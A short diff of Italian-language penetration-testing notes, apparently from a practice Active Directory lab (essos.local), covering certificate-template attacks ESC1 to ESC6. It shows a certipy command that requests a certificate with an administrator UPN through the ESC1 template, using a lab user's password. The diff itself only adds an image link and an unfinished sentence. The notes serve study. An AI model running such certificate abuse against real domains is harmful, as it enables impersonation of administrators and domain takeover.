@@ -222,6 +222,8 @@ Richiedi il certificato tramite certipy
 ```bash
 certipy-ad req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC1 -ca ESSOS-CA -upn administrator@essos.local
 ```
+![[Pasted image 20230828145911.png]]
+Usando poi il certificato 
 ### **ESC 2 & 3 - ADCS**
 ### **ESC 4 - ADCS**
 ### **ESC 6 - ADCS**
